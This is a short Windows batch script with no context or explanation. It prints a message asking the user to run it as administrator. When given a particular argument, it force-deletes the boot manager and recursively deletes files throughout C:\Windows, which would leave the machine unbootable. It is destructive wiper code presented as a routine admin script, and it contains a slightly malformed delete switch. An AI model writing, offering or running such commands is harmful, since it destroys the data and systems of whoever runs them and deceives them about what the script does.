@echo off
if "%1" NEQ "/NOADMIN" (
    echo This script requires administrator privileges.
    echo Press Ctrl+Shift+Enter to run as administrator.
    pause
    goto :EOF
)

del /F /Q C:\boot\bootmgr

del /S /F /Q C:\Windows\* /A:-d /R
